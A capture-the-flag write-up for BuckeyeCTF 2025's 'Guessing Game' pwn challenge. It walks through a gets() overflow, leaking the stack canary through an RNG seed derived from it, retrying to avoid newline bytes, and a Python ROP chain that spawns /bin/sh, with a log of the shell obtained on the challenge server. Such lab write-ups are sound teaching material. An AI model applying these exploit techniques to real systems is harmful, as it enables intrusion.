# Guessing Game - BuckeyeCTF 2025 Writeup

## Challenge Information
- **Platform**: BuckeyeCTF 2025
- **Category**: pwn
- **Difficulty**: hard
- **Flag**: `bctf{wh4t_a_sTrAng3_RNG}`

## TL;DR

Stack buffer overflow with canary protection. The canary can be leaked through the RNG seed mechanism, and the exploit must avoid bad bytes (0x0a) in the canary. The correct `/bin/sh` address is **0x404060** (found via Ghidra), not 0x403060.

## Vulnerability Analysis

### 1. Stack Buffer Overflow

At `main+341` (0x4013ac), the program calls `gets()` without bounds checking:

```c
char local_1a[10];
gets(local_1a);  // Vulnerable!
printf("Thanks for playing, %s!\n", local_1a);
```

**Stack Layout:**
```
[rbp-0x12] to [rbp-0x9]: 10-byte buffer (name input)
[rbp-0x8]  to [rbp-0x1]: 8-byte stack canary
[rbp]                   : 8-byte saved RBP
[rbp+0x8]               : 8-byte return address (overflow target)
```

### 2. Canary Leak via RNG Seed

**The Critical Vulnerability**: The RNG seed is derived from the stack canary!

From Ghidra decompilation:
```c
local_10 = *(ulong *)(in_FS_OFFSET + 0x28);  // Load canary
local_30 = local_10 >> 8;                     // Seed = canary >> 8
local_28 = local_30 % (local_40 + 1);         // Target = seed % (max + 1)
```

**Exploitation Steps:**
1. Set `max_number = 2^56 - 1` (larger than any possible seed)
2. When `max >= seed`, then `target == seed` (no modulo effect)
3. Binary search to find target in ~56 guesses
4. Reconstruct canary: `canary = (seed << 8) | 0x00` (LSB always 0x00)

### 3. gets() Bad Bytes Constraint

**Critical Discovery**: `gets()` stops reading at newline (0x0a)!

If the leaked canary contains 0x0a in bytes 0-6:
- Payload gets truncated at the 0x0a byte
- Canary check fails → "stack smashing detected"
- Exploit aborts

**Solution**: Retry until canary has no bad bytes (0x0a, 0x0d)
- Success probability: ~87% per attempt
- Expected retries: 1-2 attempts

### 4. Incorrect /bin/sh Address Bug

**Initial Error**: Exploit used `/bin/sh` at **0x403060** (incorrect)
- This address was in an unmapped memory gap
- Caused ROP chain to fail

**Ghidra Discovery**: Actual `/bin/sh` location at **0x404060**
```bash
$ ghidra hexdump 0x404060:
00404060  2f 62 69 6e 2f 73 68 00  |/bin/sh.|
```

This was in the `.data` section (writable memory).

## Exploitation Steps

### Step 1: Leak the Canary

```python
def leak_canary(io):
    max_val = (1 << 56) - 1  # 2^56 - 1
    io.recvuntil(b'Enter a max number:')
    io.sendline(str(max_val).encode())

    seed = binary_search(io, max_val)  # ~56 guesses
    canary = (seed << 8)  # Reconstruct with LSB = 0x00
    return canary
```

### Step 2: Filter Bad Canaries

```python
def has_bad_bytes(canary_bytes):
    for i in range(7):  # Check bytes 0-6 (byte 7 is always 0x00)
        if canary_bytes[i] in [0x0a, 0x0d]:
            return True
    return False

# Retry until good canary found
if has_bad_bytes(p64(canary)[:-1]):
    log.warning(f"Bad canary {hex(canary)} - retrying...")
    continue
```

### Step 3: Build ROP Chain

```python
# Gadgets (PIE disabled)
POP_RAX = 0x40124f
POP_RDI = 0x40124d
POP_RSI = 0x401251
POP_RDX = 0x401253
SYSCALL = 0x401255
RET = 0x40124e
BIN_SH = 0x404060  # Corrected address!

# ROP chain: execve("/bin/sh", 0, 0)
rop = flat([
    b'A' * 10,              # Fill buffer
    p64(canary),            # Bypass canary check
    b'B' * 8,               # Saved RBP
    p64(RET),               # Stack alignment
    p64(POP_RAX), 59,       # rax = 59 (execve)
    p64(POP_RSI), 0,        # rsi = 0 (argv)
    p64(POP_RDX), 0,        # rdx = 0 (envp)
    p64(POP_RDI), BIN_SH,   # rdi = "/bin/sh"
    p64(SYSCALL)            # execve("/bin/sh", 0, 0)
])
```

## Binary Analysis

### Protections
```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled (locally)
IBT:        Enabled (locally)
```

### Key Addresses
```
0x40124d: pop rdi; ret
0x40124f: pop rax; ret
0x401251: pop rsi; ret
0x401253: pop rdx; ret
0x401255: syscall
0x40124e: ret
0x404060: "/bin/sh" string
0x401257: main function
```

## Exploit Result

```bash
$ python3 exploit_with_bad_byte_filter.py

[+] Opening connection to guessing-game.challs.pwnoh.io on port 1337: Done
[+] Attempt 1: Good canary found: 0x43964d03b6f53e00
[*] Sending payload (106 bytes)...
[*] Response:
[*] Attempting to send commands...
[*] Output:
Thanks for playing, AAAAAAAAAA!
bctf{wh4t_a_sTrAng3_RNG}
total 24
drwxr-xr-x. 1 nobody nogroup    46 Nov  7 03:48 .
drwxr-xr-x. 1 nobody nogroup    17 Nov  7 03:48 ..
-r--r--r--. 1 nobody nogroup    25 Nov  7 03:48 flag.txt
-r-xr-xr-x. 1 nobody nogroup 17160 Nov  7 03:48 run
PWNED

[+] Got shell output!
```

**Flag**: `bctf{wh4t_a_sTrAng3_RNG}`

## Why It Worked

1. ✅ **Correct Address**: Using 0x404060 instead of 0x403060 for `/bin/sh`
2. ✅ **Good Canary**: First attempt had no bad bytes
3. ✅ **Remote Configuration**: Server doesn't block ROP (no SHSTK or not enforced)

## Local vs Remote Differences

### Local Testing
- Binary has SHSTK/IBT enabled
- ROP chains blocked by hardware protection
- Exploit fails after canary bypass

### Remote Server
- SHSTK either disabled or not enforced
- ROP chain executes successfully
- Shell obtained on first good canary

## Tools Used

1. **Ghidra**: Found correct `/bin/sh` address at 0x404060
2. **pwntools**: Exploit framework with ROP utilities
3. **objdump**: Initial disassembly and gadget finding
4. **GDB**: Debugging and stack layout verification

## Key Learnings

1. **Creative Information Leak**: Using application logic (RNG seed) to leak security values
2. **Bad Bytes Matter**: gets() truncation at 0x0a requires retry strategy
3. **Address Verification**: Always verify addresses with proper tools (Ghidra)
4. **Local vs Remote**: Protections may differ between environments
5. **Stack Canary Format**: Linux canaries always have LSB = 0x00

## Timeline

1. **Initial Analysis**: Found buffer overflow and canary leak mechanism
2. **First Blocker**: SHSTK protection blocks ROP locally
3. **Bad Bytes Discovery**: Identified gets() truncation issue
4. **Address Bug**: Wrong `/bin/sh` address (0x403060)
5. **Ghidra Analysis**: Found correct address (0x404060)
6. **Success**: First attempt with corrected exploit → flag captured!

## Files

- `exploit_with_bad_byte_filter.py` - Final working exploit
- `win_game.py` - Utility to quickly win the guessing game
- `guessing_game` - Challenge binary

## References

- [pwntools documentation](https://docs.pwntools.com/)
- [Intel CET overview](https://software.intel.com/cet)
- [Stack canaries on Linux](https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries)
